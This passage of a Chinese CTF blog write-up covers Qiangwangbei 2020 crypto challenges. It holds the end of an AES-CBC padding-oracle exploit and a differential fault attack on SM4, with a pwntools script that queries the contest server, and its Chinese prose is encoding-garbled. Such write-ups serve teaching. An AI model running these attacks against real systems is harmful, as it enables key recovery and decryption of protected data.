class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal6</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"6"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] iv+aes128_cbc(key,iv,padding(secret)):"</span>)</span><br><span class="line">    msg = unhexlify(io.recvline().strip())</span><br><span class="line">    iv, cipher = msg[:<span class="number">16</span>], msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    secret = b''</span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        for j in tqdm(range(0x100)):</span></span><br><span class="line"><span class="string">            ct = iv[:15-i] + bytes([j]) + iv[16-i:] + cipher</span></span><br><span class="line"><span class="string">            if chal6_dec(ct) == True:</span></span><br><span class="line"><span class="string">                secret = bytes([iv[-i - 1] ^ j ^ (i + 1)]) + secret</span></span><br><span class="line"><span class="string">                iv = iv[:15-i] + xor(ct[15-i:16], bytes([(i + 1) ^ (i + 2)]) * (i + 1))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">        print(secret)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    secret = <span class="string">b'\xe6?\xee\x07\xa3\x07\xaa\xc8\x8em\xb5\xa0\x90'</span></span><br><span class="line">    iv = iv[:<span class="number">16</span>-len(secret)] + xor(iv[<span class="number">16</span>-len(secret):], xor(secret, bytes([len(secret) + <span class="number">1</span>]) * len(secret)))</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret), <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> tqdm(range(<span class="number">0x100</span>)):</span><br><span class="line">            ct = iv[:<span class="number">15</span>-i] + bytes([j]) + iv[<span class="number">16</span>-i:] + cipher</span><br><span class="line">            <span class="keyword">if</span> chal6_dec(ct) == <span class="literal">True</span>:</span><br><span class="line">                secret = bytes([iv[-i - <span class="number">1</span>] ^ j ^ (i + <span class="number">1</span>)]) + secret</span><br><span class="line">                iv = iv[:<span class="number">15</span>-i] + xor(ct[<span class="number">15</span>-i:<span class="number">16</span>], bytes([(i + <span class="number">1</span>) ^ (i + <span class="number">2</span>)]) * (i + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(secret)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    passpow()</span><br><span class="line">    chal1()</span><br><span class="line">    chal2()</span><br><span class="line">    chal3()</span><br><span class="line">    chal4()</span><br><span class="line">    chal5()</span><br><span class="line">    chal6()</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"7"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_13-54-28.png" alt></p><h3 id="fault"><a href="#fault" class="headerlink" title="fault"></a>fault</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><h5 id="SM4åŠ å¯†åŸç†"><a href="#SM4åŠ å¯†åŸç†" class="headerlink" title="SM4åŠ å¯†åŸç†"></a>SM4åŠ å¯†åŸç†</h5><p>SM4æ˜æ–‡é•¿åº¦128bitsï¼Œåˆ†ä¸º4ä¸ª32bitsçš„å­—$X_{0},X_{1},X_{2},X_{3}$ï¼Œè¿›è¡Œ32è½®åŠ å¯†ï¼Œæ¯è½®çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_14-00-26.png" alt></p><p>å…¶ä¸­SM4çš„Sç›’å‡ç›¸åŒï¼Œçº¿æ€§å˜æ¢Lä¸º<code>lambda y:(y ^^ (rotl(y, 2)) ^^ (rotl(y, 10)) ^^ (rotl(y, 18)) ^^ (rotl(y, 24)))</code></p><p>æŠ½è±¡æˆ1*32çŸ©é˜µä¸32*32çŸ©é˜µç›¸ä¹˜çš„å˜æ¢å³å¯ï¼Œå‘ç°è¯¥32*32çš„ç³»æ•°çŸ©é˜µå¯é€†ï¼Œå³Lå¯é€†ï¼ˆæ³¨æ„è½¬ç½®ç³»æ•°çŸ©é˜µï¼Œä¸”è¦åœ¨GF(2)ä¸‹ï¼‰</p><p>ç¬¬32è½®åŠ å¯†åï¼Œè¦å®ç°ä¸€æ¬¡$X_{32},X_{33},X_{34},X_{35}$å››å­—çš„é€†åºï¼Œå³C=($X_{35},X_{34},X_{33},X_{32}$)</p><h5 id="SM4å¯†é’¥æ‰©å±•"><a href="#SM4å¯†é’¥æ‰©å±•" class="headerlink" title="SM4å¯†é’¥æ‰©å±•"></a>SM4å¯†é’¥æ‰©å±•</h5><p>ç³»ç»Ÿå‚æ•°$FK=(FK_{0},FK_{1},FK_{2},FK_{3}),FK_{i}\in F_{2}^{32}$åŠ$CK=(CK_{0},CK_{1}â€¦,CK_{31}),CK_{i}\in F_{2}^{32}$å›ºå®š</p><p>å¯†é’¥ä¸º$(MK_{0},MK_{1},MK_{2},MK_{3})$ï¼Œåˆ™åˆå§‹åŒ–</p><p>$(K_{0},K_{1},K_{2},K_{3})=(MK_{0}\oplus FK_{0},MK_{1}\oplus FK_{1},MK_{2}\oplus FK_{2},MK_{3}\oplus FK_{3})$</p><p>è¿­ä»£$rk_{i}=K_{i+4}=K_{i}\oplus T(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_{i}),i=0,1,â€¦,31$</p><p>å³å¯è·å¾—å®Œæ•´çš„32ä¸ªè½®å¯†é’¥$rk_{i}$</p><p>(Tå‡½æ•°ä¸SM4åŠ å¯†è½®å‡½æ•°ä¸­çš„S+LåŸºæœ¬ç±»ä¼¼ï¼Œåªéœ€å°†Læ”¹ä½œ<code>lambda y:(y ^^ (rotl(y, 13)) ^^ (rotl(y, 23))</code>å³å¯)</p><h5 id="SM4æ•…éšœå·®åˆ†åˆ†æ"><a href="#SM4æ•…éšœå·®åˆ†åˆ†æ" class="headerlink" title="SM4æ•…éšœå·®åˆ†åˆ†æ"></a>SM4æ•…éšœå·®åˆ†åˆ†æ</h5><p>åŸºäºèƒ½åœ¨SM4çš„æŸè½®è½®å‡½æ•°ä¸­æ³¨å…¥é”™è¯¯ï¼ŒæŒºæœ‰æ„æ€çš„æ”»å‡»- -</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>é€‰æ‹©éšæœºæ˜æ–‡ï¼Œå‘é€è‡³æœåŠ¡ç«¯è¿›è¡ŒåŠ å¯†ï¼Œæ‹¿åˆ°è¿”å›çš„ct</li><li>é€‰æ‹©å’Œä¸Šä¸€æ­¥ç›¸åŒçš„æ˜æ–‡ï¼Œä½†åœ¨æŸè½®æ³¨å…¥é”™è¯¯ï¼Œè·å–è¿”å›çš„ct_astï¼ŒåŒæ—¶ä¹Ÿè®°å½•å¯†æ–‡å·®åˆ†ct_diff</li><li>é™è½®æ¬¡çš„å¸¸è§„å·®åˆ†æ”»å‡»orç›´æ¥å¯¹Sç›’çš„å·®åˆ†æ”»å‡»</li></ul><p>ç”±äºæœ¬é¢˜ä¸­çš„å‡ºé”™è½®æ¬¡(0~31)ï¼Œå‡ºé”™å­—èŠ‚ä¸‹æ ‡(0~15)ï¼Œå‡ºé”™å­—èŠ‚å¼‚æˆ–ä¸Šçš„fault(0~0xfe)å‡å¯æ§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.send(<span class="string">b"give me the value of r f p"</span>, <span class="literal">False</span>)</span><br><span class="line">tmp = self.recv(prompt=<span class="string">b":"</span>)</span><br><span class="line">r, f, p = tmp.split(<span class="string">b" "</span>)</span><br><span class="line">r = int(r) % <span class="number">0x20</span></span><br><span class="line">f = int(f) % <span class="number">0xff</span></span><br><span class="line">p = int(p) % <span class="number">16</span></span><br><span class="line">ct = self.encrypt2(key, unhexlify(pt), r, f, p)</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…¶è½¬åŒ–ä¸ºå¯¹å•ä¸ªSç›’çš„å·®åˆ†æ”»å‡»ï¼ˆå¸¸è§„å·®åˆ†æ”»å‡»åŸºäºé«˜æ¦‚ç‡å·®åˆ†ç‰¹å¾ï¼Œçˆ†ç ´keyéƒ¨åˆ†æ¯”ç‰¹è§‚å¯Ÿcounteræ¥å®ç°ï¼Œä½†å¯¹äºå•ä¸ªSç›’çš„å·®åˆ†æ”»å‡»åˆ™åªéœ€æ±‚äº¤é›†å³å¯ï¼‰</p><p><strong>ä¸”åœ¨å¯¹äºå•ä¸ªSç›’çš„å·®åˆ†æ”»å‡»ä¸­ï¼Œè‹¥å›ºå®šè¾“å…¥å·®åˆ†æˆ–è¾“å‡ºå·®åˆ†å…¶ä¸­ä»»ä¸€è€…ï¼Œå‡åªèƒ½è‡³å¤šå°†keyå€™é€‰é™è‡³2ä¸ªï¼Œæƒ³è¦ç¡®å®šå”¯ä¸€çš„keyï¼Œåˆ™å¿…é¡»æœ‰è‡³å°‘ä¸¤ä¸ªè¾“å‡ºå·®åˆ†æ¥è¿›è¡Œå…±åŒå·®åˆ†åˆ†æå–keyäº¤é›†</strong></p><p>ä¹Ÿæ­£æ˜¯å› ä¸ºè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¦ç ´è§£key[31]ï¼Œæ‰€é€‰æ³¨å…¥faultçš„åœ°æ–¹åº”ä¸ºç¬¬29è½®çš„ç¬¬16ä¸ªå­—èŠ‚ï¼Œä¸”è¦æ³¨å…¥ä¸¤æ¬¡ä¸åŒé”™è¯¯æ¥å…±åŒåˆ†æï¼ˆæ¯”å¦‚å½“æˆ‘ä»¬é€‰æ‹©ç¬¬31è½®å‡ºé”™æ—¶ï¼Œç”±äºé¢˜ç›®åªå…è®¸åœ¨æ¯ä¸€è½®çš„åå››ä¸ªå­—èŠ‚ä¹‹ä¸€å‡ºé”™ï¼Œå› æ­¤æ— æ³•ç¯¡æ”¹X31â€™ï¼Œå…¶å€¼å°†å›ºå®šä¸º0x00000000ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_18-01-26.png" alt></p><p>åœ¨ç¬¬29è½®æ³¨å…¥faultï¼ˆå‡è®¾ä¸º0x22ï¼‰åï¼Œ</p><p>å¯ä»¥å‘ç°ç¬¬29è½®çš„å·®åˆ†ä¸º0x00000000, 0x00000000, 0x00000000, 0x00000022</p><p>åˆ™ç¬¬32è½®çš„è¾“å‡ºå·®åˆ†ä¸º$X31â€™\oplus X35â€™$ï¼Œè¾“å…¥å·®åˆ†ä¸º$X32â€™\oplus X33â€™\oplus X34â€™$ï¼Œä¸”ct_diffå¯¹åº”çš„ctå’Œct_astä¹Ÿå‡å·²çŸ¥ï¼Œé€†Læ¨¡å—åå¯¹Sç›’è¿›è¡Œå·®åˆ†æ”»å‡»å³å¯</p><p>ä¸Šè¿°æ”»å‡»æˆåŠŸåï¼Œä¼šä»¤K[31]ç•™ä¸‹ä¸¤ä¸ªcandidateï¼Œæ­¤æ—¶å†æ³¨å…¥fault=0x33ï¼Œé‡å¤æ“ä½œå³å¯å”¯ä¸€ç¡®å®šK[31]</p><p>å¾—åˆ°K[31]åï¼Œæˆ‘ä»¬å¯å¯¹æ”»å‡»K[31]æ—¶çš„æ‰€æœ‰å¯†æ–‡æ•°æ®è¿›è¡Œä¸€è½®è§£å¯†ï¼Œå¾—åˆ°31è½®åŠ å¯†åçš„ç»“æœåŠåŠ å¯†å·®åˆ†ï¼Œç±»ä¼¼å¯¹Sç›’è¿›è¡Œå·®åˆ†åˆ†æï¼Œç›´åˆ°æ¢å¤å‡ºK[30]å’ŒK[29]</p><p>ä½†ç”±äºSM4çš„å¯†é’¥ç”Ÿæˆç®—æ³•ï¼Œè‡³å°‘éœ€è¦å››ä¸ªè¿ç»­Kï¼Œæ‰èƒ½æ¢å¤å‡ºå®Œæ•´32ä¸ªå­å¯†é’¥ï¼Œå› æ­¤æˆ‘ä»¬å¯¹26è½®ç¬¬16ä¸ªå­—èŠ‚æ³¨å…¥é”™è¯¯0x22å’Œ0x33ï¼Œå¹¶åˆ©ç”¨å·²å¾—åˆ°çš„K[29:32]è¿›è¡Œè§£å¯†å¾—åˆ°ç¬¬29è½®åŠ å¯†åçš„ç»“æœåŠåŠ å¯†å·®åˆ†ï¼Œæ­¤æ—¶æƒ…å†µå·²ç­‰ä»·äºæ±‚è§£K[31]</p><p>æ¢å¤å‡ºå­å¯†é’¥K[28:32]åï¼Œé€†å‘å¾—åˆ°32ä¸ªå­å¯†é’¥ï¼Œè§£å¯†å¾—åˆ°flag</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><p><strong>Expè¢«æˆ‘å†™çš„æå…¶å†—ä½™â€¦å‡‘åˆçœ‹8</strong></p><p><code>get_data.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"39.101.134.52"</span>, <span class="string">"8006"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"XXX\+([^\)]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest() ==</span><br><span class="line">                        cipher, string.ascii_letters + string.digits, length=<span class="number">3</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXX:"</span>, proof)</span><br><span class="line">    io.sendlineafter(<span class="string">"teamtoken:"</span>, <span class="string">"icq6c57ba701346474cd670a5f3b1c66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_enc_flag</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvline()</span><br><span class="line">    enc_flag = io.recvline().strip().decode()</span><br><span class="line">    <span class="keyword">return</span> enc_flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'your plaintext in hex:'</span>, hexlify(m))</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    c = re.findall(<span class="string">r"your ciphertext in hex:(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_fault</span><span class="params">(m, r, f, p)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'your plaintext in hex:'</span>, hexlify(m))</span><br><span class="line">    io.sendlineafter(<span class="string">'give me the value of r f p:'</span>, <span class="string">'&#123;&#125; &#123;&#125; &#123;&#125;'</span>.format(r, f, p))</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    c = re.findall(<span class="string">r"your ciphertext in hex:(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    enc_flag = get_enc_flag()</span><br><span class="line">    r, f, p = <span class="number">29</span>, <span class="number">0x22</span>, <span class="number">15</span></span><br><span class="line">    fw = open(<span class="string">'data'</span>, <span class="string">'w'</span>)</span><br><span class="line">    fw.write(enc_flag + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment"># prepared for rk[29], rk[30], rk[31]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    f = <span class="number">0x33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    <span class="comment"># prepared for rk[28]</span></span><br><span class="line">    r -= <span class="number">3</span></span><br><span class="line">    f = <span class="number">0x22</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    f = <span class="number">0x33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>exp_fault.sage</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span 